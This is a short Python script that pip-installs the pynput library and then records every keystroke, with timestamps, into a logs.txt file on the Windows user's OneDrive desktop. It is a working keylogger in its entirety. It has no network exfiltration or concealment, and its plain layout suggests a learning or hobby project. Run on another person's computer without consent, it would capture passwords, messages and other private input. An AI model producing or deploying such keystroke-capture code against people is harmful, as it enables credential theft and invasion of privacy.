import os
import sys
import subprocess
import logging
from shutil import copyfile
import time 

#installing requied module
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
time.sleep(2)

from pynput.keyboard import Listener
username = os.getlogin()
logging_directory = f"C:/Users/{username}/OneDrive/Desktop"
file = open(f"C:/Users/{username}/OneDrive/Desktop/logs.txt","w")

logging.basicConfig(filename=f"{logging_directory}/logs.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
def key_handler(key):
    logging.info(key)
with Listener(on_press =key_handler) as listener:
    listener.join()

